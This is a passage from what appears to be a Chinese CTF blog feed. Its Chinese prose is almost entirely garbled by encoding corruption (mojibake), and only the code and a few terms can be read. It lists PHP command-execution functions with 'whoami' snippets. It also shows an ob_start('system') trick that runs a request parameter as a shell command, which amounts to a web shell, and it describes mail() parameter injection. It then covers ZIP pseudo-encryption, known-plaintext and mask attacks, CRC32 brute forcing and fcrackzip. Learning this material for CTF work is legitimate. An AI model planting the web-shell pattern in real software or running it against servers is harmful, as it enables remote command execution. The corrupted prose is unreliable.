passthru(&quot;whoami&quot;);?&gt;</code></pre><p>exec()</p><blockquote><p>exec â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº</p></blockquote><pre><code>string exec( string $command[, array &amp;$output[, int &amp;$return_var]] )</code></pre><p>exec() æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚</p><blockquote><p>å¦‚æœæä¾›äº† output å‚æ•°ï¼Œé‚£ä¹ˆä¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œæ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚æ•°ç»„ä¸­çš„æ•°æ®ä¸åŒ…å«è¡Œå°¾çš„ç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ \n å­—ç¬¦ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ•°ç»„ä¸­å·²ç»åŒ…å«äº†éƒ¨åˆ†å…ƒç´ ï¼Œexec() å‡½æ•°ä¼šåœ¨æ•°ç»„æœ«å°¾è¿½åŠ å†…å®¹ã€‚å¦‚æœä½ ä¸æƒ³åœ¨æ•°ç»„æœ«å°¾è¿›è¡Œè¿½åŠ ï¼Œè¯·åœ¨ä¼ å…¥ exec() å‡½æ•°ä¹‹å‰å¯¹æ•°ç»„ä½¿ç”¨ unset() å‡½æ•°è¿›è¡Œé‡ç½®ã€‚<br>å¦‚æœåŒæ—¶æä¾› output å’Œ return_var å‚æ•°ï¼Œå‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€ä¼šè¢«å†™å…¥åˆ°æ­¤å˜é‡</p></blockquote><pre><code>&lt;?php    echo exec(&quot;whoami&quot;);?&gt;</code></pre><p>pcntl_exec()</p><blockquote><p>pcntl_exec â€” åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</p></blockquote><pre><code>void pcntl_exec( string $path[, array $args[, array $envs]] )</code></pre><p>ä»¥ç»™å®šçš„å‚æ•°æ‰§è¡Œç¨‹åº</p><blockquote><p>pathå¿…é¡»æ—¶å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬ï¼ˆæ¯”å¦‚æ–‡ä»¶ç¬¬ä¸€è¡Œæ˜¯#!/usr/local/bin/perlçš„perlè„šæœ¬ï¼‰ã€‚<br>argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>envsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºä½œä¸ºç¯å¢ƒå˜é‡çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„æ˜¯ key =&gt; valueæ ¼å¼çš„ï¼Œkeyä»£è¡¨è¦ä¼ é€’çš„ç¯å¢ƒå˜é‡çš„åç§°ï¼Œvalueä»£è¡¨è¯¥ç¯å¢ƒå˜é‡å€¼ã€‚ </p></blockquote><pre><code>&lt;?php    pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt;</code></pre><p>shell_exec()</p><blockquote><p>shell_exec â€” é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚</p></blockquote><pre><code>&lt;?php    echo shell_exec(&quot;whoami&quot;);?&gt;</code></pre><p>popen()</p><blockquote><p>popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</p></blockquote><pre><code>resource popen( string $command, string $mode)</code></pre><blockquote><p>æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿã€‚<br>å½“æ¨¡å¼ä¸º â€˜râ€™ï¼Œè¿”å›çš„æ–‡ä»¶æŒ‡é’ˆç­‰äºå‘½ä»¤çš„ STDOUTï¼Œå½“æ¨¡å¼ä¸º â€˜wâ€™ï¼Œè¿”å›çš„æ–‡ä»¶æŒ‡é’ˆç­‰äºå‘½ä»¤çš„ STDINã€‚ </p></blockquote><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt; </code></pre><p>proc_open()</p><blockquote><p>proc_open â€” æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥/è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚ </p></blockquote><pre><code>resource proc_open( string $cmd, array $descriptorspec, array &amp;$pipes[, string $cwd[, array $env[, array $other_options]]] )</code></pre><blockquote><p>descriptorspec<br>ä¸€ä¸ªç´¢å¼•æ•°ç»„ã€‚æ•°ç»„çš„é”®è¡¨ç¤ºæè¿°ç¬¦ï¼Œæ•°ç»„å…ƒç´ å€¼è¡¨ç¤º PHP å¦‚ä½•å°†è¿™äº›æè¿°ç¬¦ä¼ é€è‡³å­è¿›ç¨‹ã€‚ 0 è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ï¼Œ1 è¡¨ç¤ºæ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œ2 è¡¨ç¤ºæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰ã€‚ </p><p>æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ï¼š<br>â€¢åŒ…å«äº†è¦ä¼ é€è‡³è¿›ç¨‹çš„ç®¡é“çš„æè¿°ä¿¡æ¯ã€‚ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæè¿°ç¬¦ç±»å‹ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯é’ˆå¯¹è¯¥æè¿°ç¬¦çš„é€‰é¡¹ã€‚æœ‰æ•ˆçš„ç±»å‹æœ‰ï¼špipe ï¼ˆç¬¬äºŒä¸ªå…ƒç´ å¯ä»¥æ˜¯ï¼š r å‘è¿›ç¨‹ä¼ é€è¯¥ç®¡é“çš„è¯»å–ç«¯ï¼Œw å‘è¿›ç¨‹ä¼ é€è¯¥ç®¡é“çš„å†™å…¥ç«¯ï¼‰ï¼Œä»¥åŠ fileï¼ˆç¬¬äºŒä¸ªå…ƒç´ ä¸ºæ–‡ä»¶åï¼‰ã€‚<br>â€¢è¡¨è¾¾ä¸€ä¸ªçœŸå®æ–‡ä»¶æè¿°ç¬¦çš„æµèµ„æºç±»å‹ï¼ˆä¾‹å¦‚ï¼šå·²æ‰“å¼€çš„æ–‡ä»¶ï¼Œä¸€ä¸ª socket ç«¯å£ï¼ŒSTDINï¼‰ã€‚ </p></blockquote><p>`(åå•å¼•å·)</p><p>åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼Œä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œ`â€çš„æ•ˆæœä¸å‡½æ•° shell_exec() ç›¸åŒã€‚</p><pre><code>&lt;?php    echo `whoami`;?&gt;</code></pre><p>ob_start()</p><blockquote><p>ob_start â€” æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</p></blockquote><pre><code>bool ob_start([ callback $output_callback[, int $chunk_size[, bool $erase]]] )</code></pre><blockquote><p>æ­¤å‡½æ•°å°†æ‰“å¼€è¾“å‡ºç¼“å†²ã€‚å½“è¾“å‡ºç¼“å†²æ¿€æ´»åï¼Œè„šæœ¬å°†ä¸ä¼šè¾“å‡ºå†…å®¹ï¼ˆé™¤httpæ ‡å¤´å¤–ï¼‰ï¼Œç›¸åéœ€è¦è¾“å‡ºçš„å†…å®¹è¢«å­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚ </p></blockquote><p>ä¸‹é¢çš„ä»£ç ï¼Œç”±äºè°ƒç”¨äº†ob_end_flush()ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ob_start(cmd)ä¸­çš„cmdï¼ŒæŠŠæˆ‘ä»¬è¾“å…¥çš„_GET[a]ä½œä¸ºcmdçš„å‚æ•°ã€‚</p><pre><code>&lt;?php    $cmd = &apos;system&apos;;    ob_start($cmd);    echo &quot;$_GET[a]&quot;;    ob_end_flush();?&gt;</code></pre><p>è®¿é—®ï¼š</p><pre><code>http://xxx/php_cmd.php?a=whoami</code></pre><p>php mail()</p><p>mail()æ–‡æ¡£<a href="http://php.net/manual/zh/function.mail.php" title="mailæ–‡æ¡£" target="_blank" rel="noopener">http://php.net/manual/zh/function.mail.php</a></p><pre><code>bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])</code></pre><p>è¦ä½¿ç”¨mail()å‡½æ•°ï¼Œéœ€è¦é…ç½®å¯¹åº”çš„æœåŠ¡å™¨ç­‰ï¼Œåœ¨php.iniä¸­æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼š</p><pre><code>é…ç½®SMTPæœåŠ¡å™¨çš„ä¸»æœºåå’Œç«¯å£é…ç½®PHPç”¨ä½œé‚®ä»¶ä¼ è¾“ä»£ç†ï¼ˆMTAï¼‰çš„æ–‡ä»¶è·¯å¾„</code></pre><p>å½“PHPé…ç½®äº†ç¬¬äºŒä¸ªé€‰é¡¹æ—¶ï¼Œå¯¹è¯¥mail()å‡½æ•°çš„è°ƒç”¨å°†å¯¼è‡´æ‰§è¡Œé…ç½®å¯¹MTAç¨‹åºã€‚è™½ç„¶PHPå†…éƒ¨ä½¿ç”¨escapeshellcmd()ç”¨äºç¨‹åºè°ƒç”¨ï¼Œé˜²æ­¢æ–°çš„shellå‘½ä»¤æ³¨å…¥ï¼Œä½†ç¬¬5ä¸ªå‚æ•°$additional_parametersä¸­mail()å…è®¸æ·»åŠ çš„æ–°ç¨‹åºã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é™„åŠ ç¨‹åºæ ‡å¿—ï¼Œåœ¨æŸäº›MTAä¸­å¯ä»¥åˆ›å»ºå…·æœ‰ç”¨æˆ·æ§åˆ¶å†…å®¹çš„æ–‡ä»¶ã€‚</p><p>å®ä¾‹ï¼š<a href="http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/" title="å¤šä¸ªphp mailå‡½æ•°å¼•å‘çš„å‘½ä»¤æ‰§è¡Œæ¼æ´" target="_blank" rel="noopener">http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/</a></p><p>å‚è€ƒï¼š<a href="http://www.91ri.org/17039.html" title="ä¸ºä»€ä¹ˆmail()å‡½æ•°åœ¨phpä¸­æ˜¯å±é™©çš„" target="_blank" rel="noopener">http://www.91ri.org/17039.html</a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP&#39;s things</title>
      <link href="/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/03/23/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>åªè¦æˆ‘Eçš„å¤Ÿå¿«ï¼Œå¯‚å¯å°±è¿½ä¸ä¸Šæˆ‘ï¼</p><p>å¯¹ä¸èµ·ï¼Œèµ°é”™ç‰‡åœºäº†~ğŸ˜„</p><a id="more"></a><p>##0x01 zipæ–‡ä»¶ç»„æˆ ##</p><p><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</strong></p><h3 id="1-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"><a href="#1-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº" class="headerlink" title="1 å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"></a>1 å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</h3><p>åœ¨è¿™ä¸ªæ•°æ®åŒºä¸­æ¯ä¸ªå‹ç¼©æ–‡ä»¶çš„æºæ–‡ä»¶/ç›®å½•éƒ½æ˜¯ä¸€æ¡è®°å½•ï¼Œè®°å½•æ ¼å¼å¦‚ä¸‹[æ–‡ä»¶å¤´+æ–‡ä»¶æ•°æ®+æ•°æ®æè¿°ç¬¦]</p><h4 id="æ–‡ä»¶å¤´ç»“æ„"><a href="#æ–‡ä»¶å¤´ç»“æ„" class="headerlink" title="æ–‡ä»¶å¤´ç»“æ„"></a>æ–‡ä»¶å¤´ç»“æ„</h4><hr><pre><code>      ç»„æˆ    ã€€                é•¿åº¦  æ–‡ä»¶å¤´æ ‡è®°                  4 bytes  (0x04034b50)  è§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬    2 bytes å…¨å±€æ–¹å¼ä½æ ‡è®°              2 byteså‹ç¼©æ–¹å¼                    2 bytesæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´             2 bytesæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ             2 bytesCRC-32æ ¡éªŒ                  4 byteså‹ç¼©åå°ºå¯¸                  4 bytesæœªå‹ç¼©å°ºå¯¸                  4 bytesæ–‡ä»¶åé•¿åº¦                  2 bytes  æ‰©å±•è®°å½•é•¿åº¦                2 bytesæ–‡ä»¶å                     ï¼ˆä¸å®šé•¿åº¦ï¼‰æ‰©å±•å­—æ®µ                   ï¼ˆä¸å®šé•¿åº¦ï¼‰</code></pre><h4 id="æ–‡ä»¶æ•°æ®"><a href="#æ–‡ä»¶æ•°æ®" class="headerlink" title="æ–‡ä»¶æ•°æ®"></a>æ–‡ä»¶æ•°æ®</h4><p>å°±æ˜¯æ•°æ®</p><h4 id="æ•°æ®æè¿°ç¬¦"><a href="#æ•°æ®æè¿°ç¬¦" class="headerlink" title="æ•°æ®æè¿°ç¬¦"></a>æ•°æ®æè¿°ç¬¦</h4><hr><pre><code> ã€€ã€€ã€€ç»„æˆ    ã€€é•¿åº¦CRC-32æ ¡éªŒ                  4 byteså‹ç¼©åå°ºå¯¸                   4 bytesæœªå‹ç¼©å°ºå¯¸                   4 bytes</code></pre><p>è¿™ä¸ªæ•°æ®æè¿°ç¬¦åªåœ¨å…¨å±€æ–¹å¼ä½æ ‡è®°çš„ç¬¬ä¸‰ä½è®¾ä¸º1æ—¶æ‰å­˜åœ¨ï¼Œç´§æ¥åœ¨å‹ç¼©æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚åã€‚</p><h3 id="2-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº"><a href="#2-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº" class="headerlink" title="2.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº"></a>2.å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</h3><p>åœ¨è¿™ä¸ªæ•°æ®åŒºä¸­æ¯ä¸€æ¡è®°å½•å¯¹åº”åœ¨å‹ç¼©æºæ–‡ä»¶åŒºä¸­çš„ä¸€æ¡æ•°æ®</p><hr><pre><code>   ã€€ã€€ã€€ç»„æˆ               ã€€            é•¿åº¦ã€€ã€€ç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°             4 bytes  (0x02014b50)ã€€ã€€å‹ç¼©ä½¿ç”¨çš„ã€€pkware ç‰ˆæœ¬          2 bytesã€€ã€€è§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬         2 bytesã€€ã€€å…¨å±€æ–¹å¼ä½æ ‡è®°                   2 bytesã€€ã€€å‹ç¼©æ–¹å¼                        2 bytesã€€ã€€æœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´                 2 bytesã€€ã€€æœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ                 2 bytesã€€ã€€ï¼£ï¼²ï¼£ï¼ï¼“ï¼’æ ¡éªŒ                 4 bytesã€€ã€€å‹ç¼©åå°ºå¯¸                      4 bytesã€€ã€€æœªå‹ç¼©å°ºå¯¸                      4 bytesã€€ã€€æ–‡ä»¶åé•¿åº¦                      2 bytesã€€ã€€æ‰©å±•å­—æ®µé•¿åº¦                    2 bytesã€€ã€€æ–‡ä»¶æ³¨é‡Šé•¿åº¦                    2 bytesã€€ã€€ç£ç›˜å¼€å§‹å·                      2 bytesã€€ã€€å†…éƒ¨æ–‡ä»¶å±æ€§                    2 bytesã€€ã€€å¤–éƒ¨æ–‡ä»¶å±æ€§                    4 byteså±€éƒ¨å¤´éƒ¨åç§»é‡                  4 bytesã€€ã€€æ–‡ä»¶å                       ï¼ˆä¸å®šé•¿åº¦ï¼‰ã€€ã€€æ‰©å±•å­—æ®µ                     ï¼ˆä¸å®šé•¿åº¦ï¼‰æ–‡ä»¶æ³¨é‡Š                     ï¼ˆä¸å®šé•¿åº¦ï¼‰</code></pre><h3 id="3-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—"><a href="#3-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—" class="headerlink" title="3.å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—"></a>3.å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</h3><hr><pre><code>ã€€ã€€ã€€ç»„æˆ               ã€€          é•¿åº¦ç›®å½•ç»“æŸæ ‡è®°                    4 bytes  (0x02014b50)å½“å‰ç£ç›˜ç¼–å·                    2 bytesç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·              2 bytesã€€ã€€æœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°                 2 bytesã€€ã€€ç›®å½•åŒºä¸­çºªå½•æ€»æ•°                 2 bytesã€€ã€€ç›®å½•åŒºå°ºå¯¸å¤§å°                   4 bytesã€€ã€€ç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡        4 bytesã€€ã€€ZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦                 2 bytesã€€ã€€ZIP æ–‡ä»¶æ³¨é‡Š                   ï¼ˆä¸å®šé•¿åº¦ï¼‰</code></pre><p>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°æ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—åªæœ‰22ä½ï¼Œå¦‚æœè¶…å‡ºè¿™éƒ¨åˆ†åˆ™å¯èƒ½æ˜¯éšè—æ•°æ®(ä»Šå¤©çœŸçš„æ˜¯è¢«æ¡‚ç”µçš„MISCç»™è™å“­äº†/(ã„’oã„’)/~~)ã€‚</p><h2 id="0x02-ZIPä¼ªåŠ å¯†"><a href="#0x02-ZIPä¼ªåŠ å¯†" class="headerlink" title="0x02 ZIPä¼ªåŠ å¯†"></a>0x02 ZIPä¼ªåŠ å¯†</h2><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kazyuumnj30gx0de41x.jpg" alt></p><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºâ€“å¤´æ–‡ä»¶æ ‡å¿—ï¼š50 4B 03 04</p><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</p><ul><li>ç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡å¿—ï¼š50 4B 01 02</li><li>å‹ç¼©ä½¿ç”¨çš„pkware:     3F 00</li><li>ç´§è·Ÿç€æ˜¯è§£å‹æ–‡ä»¶æ‰€éœ€è¦çš„pkwareç‰ˆæœ¬ï¼š14 00</li><li>å…¨å±€æ–¹å¼ä½æ ‡è®°ï¼š00 00(æ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00å°±ä¼šæç¤ºæœ‰å¯†ç ï¼Œå®é™…ä¸Šåªè¦æ˜¯ä»¥å¥‡æ•°ç»“å°¾å³å¯)</li></ul><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š50 4B 05 06</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5kb023lp3j30gx0d4jug.jpg" alt></p><p>å¦‚ä½•åˆ¤æ–­ä¼ªåŠ å¯†ï¼Ÿ</p><p>æ— åŠ å¯†</p><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º00 00</p><p>å‡åŠ å¯†</p><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00</p><p>çœŸåŠ å¯†</p><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º09 00<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00</p><h2 id="0x03-ZIPæ˜æ–‡æ”»å‡»"><a href="#0x03-ZIPæ˜æ–‡æ”»å‡»" class="headerlink" title="0x03 ZIPæ˜æ–‡æ”»å‡»"></a>0x03 ZIPæ˜æ–‡æ”»å‡»</h2><p>å¦‚æœä¸€ä¸ªå‹ç¼©åŒ…ä½ ä¸çŸ¥é“å¯†ç ï¼Œä½†æ˜¯å‹ç¼©åŒ…é‡Œæœ‰ä¸€ä¸ªå·²çŸ¥æ–‡ä»¶ï¼ˆæ–‡ä»¶å¤§å°å¤§äº12Byteï¼‰ï¼Œå› ä¸ºåŒä¸€ä¸ªå‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶éƒ½æ˜¯é‡‡ç”¨åŒä¸€ä¸ªå¯†é’¥åŠ å¯†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å·²çŸ¥æ–‡ä»¶æ¥æ‰¾å¯†é’¥ã€‚</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb052ll8j30g70fhwhx.jpg" alt></p><h2 id="0x03-ZIPæ©ç æ”»å‡»"><a href="#0x03-ZIPæ©ç æ”»å‡»" class="headerlink" title="0x03 ZIPæ©ç æ”»å‡»"></a>0x03 ZIPæ©ç æ”»å‡»</h2><p>å·²çŸ¥å¯†ç çš„æŸå‡ ä½è¿›è¡Œæ„é€ ï¼Œè¿™é‡Œä»¥æ¡‚ç”µçš„MISCä¸ºä¾‹ï¼Œå‰é¢æˆ‘ä»¬å·²ç»è§£å¼€ä¸¤å±‚åŠ å¯†ï¼Œå¾—åˆ°äº†æœ€åçš„111.zip,<br>é‡Œé¢æœ‰</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5kb0bwn1ej305b02bt8i.jpg" alt></p><p>æ‰“å¼€.shæ–‡ä»¶æ˜¯è¿™æ ·çš„å†…å®¹</p><pre><code>#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&apos;time&apos;).time())&quot;` flag.zip flag</code></pre><p>è·‘ä¸€ä¸‹å‘½ä»¤</p><pre><code>&gt;&gt;&gt; print(__import__(&apos;time&apos;).time())1558685006.11</code></pre><p>å¤§æ¦‚å½¢å¼çŸ¥é“äº†å°è¯•æ©ç æ”»å‡»</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0ltqooj30fh0f0gp8.jpg" alt></p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5kb0oiik6j30f206d0tr.jpg" alt></p><h2 id="0x04-CRC32ç¢°æ’"><a href="#0x04-CRC32ç¢°æ’" class="headerlink" title="0x04 CRC32ç¢°æ’"></a>0x04 CRC32ç¢°æ’</h2><p>CRCæœ¬èº«æ˜¯å¾ªç¯å†—ä½™æ ¡éªŒç çš„æ„æ€ï¼ŒCRC32åˆ™è¡¨ç¤ºäº§ç”Ÿä¸€ä¸ª32bitï¼ˆ8ä½åå…­è¿›åˆ¶æ•°ï¼‰çš„æ ¡éªŒå€¼</p><p>åœ¨ç”Ÿæˆè¯¥æ ¡éªŒå€¼çš„æ—¶å€™æºæ•°æ®æ¯ä¸€ä½éƒ½å‚ä¸äº†è¿ç®—ï¼Œå› æ­¤å³ä½¿æ•°æ®å—ä¸­åªæœ‰ä¸€ä½å‘ç”Ÿæ”¹å˜ä¹Ÿä¼šå¾—åˆ°ä¸åŒçš„CRC32å€¼ï¼Œåˆ©ç”¨è¿™ä¸ªåŸç†æˆ‘ä»¬å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºåŠ å¯†æ–‡ä»¶çš„å†…å®¹ã€‚<br>è¿™é‡Œåšæµ‹è¯•ç”¨æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå†…å®¹åªæœ‰â€˜1234â€™çš„txtæ–‡ä»¶å¹¶è¿›è¡Œå‹ç¼©ï¼Œå¾—åˆ°å‹ç¼©çš„CRCå€¼ï¼Œå†™è„šæœ¬è¿›è¡Œçˆ†ç ´</p><pre><code>import binasciicrc=0x9BE3E0A3for i in range(1000,9999+1):if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:    print i</code></pre><p>ç”±äºå†…å®¹è¾ƒçŸ­å‡ ç§’å°±ç¢°æ’å‡ºæ–‡ä»¶å†…å®¹ã€‚</p><p>åœ¨PY2.xç‰ˆæœ¬ä¸­ã€‚binascii.crc32ä¸­æ‰€è®¡ç®—å‡ºçš„CRCå€¼åŸŸä¸º[-2^31,2^31-1]ä¹‹é—´çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä¸ºäº†ä¸ä¸€èˆ¬çš„CRCç»“æœå¯¹æ¯”ï¼Œéœ€è¦å°†å…¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥åŠ ä¸Š &amp; 0xfffffffffæ¥è¿›è¡Œè½¬æ¢</p><pre><code>&gt;&gt;&gt; str1=0x4D2&gt;&gt;&gt; str2=str1 &amp; 0xffff&gt;&gt;&gt; print str21234</code></pre><p>å¦‚æœæ˜¯py3.xç‰ˆæœ¬è®¡ç®—ç»“æœä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œå°±ä¸ç”¨åŠ äº†ã€‚ </p><h2 id="0x05-å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„"><a href="#0x05-å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„" class="headerlink" title="0x05 å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„"></a>0x05 å…¶ä»–ä¹±ä¸ƒå…«ç³Ÿçš„</h2><h3 id="å…³äºfcrackzip"><a href="#å…³äºfcrackzip" class="headerlink" title="å…³äºfcrackzip"></a>å…³äºfcrackzip</h3><p>ä½œä¸ºkaliè‡ªå¸¦çš„å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥è¿›è¡Œçˆ†ç ´å·¥ä½œï¼Œè¿™é‡Œè¿˜æ˜¯ç”¨æ¡‚ç”µçš„MISC-222.zipä¸ºä¾‹</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5kb0955f3j30ls0fndvz.jpg" alt></p><p>ç”±èœå•å¯çŸ¥-b æ˜¯çˆ†ç ´ï¼Œ-c æŒ‡å®šå­—ç¬¦é›†,-læŒ‡å®šé•¿åº¦,-u ç”¨è§£å‹çš„æ–¹å¼æ·˜æ±°æ‰é”™è¯¯çš„å¯†ç 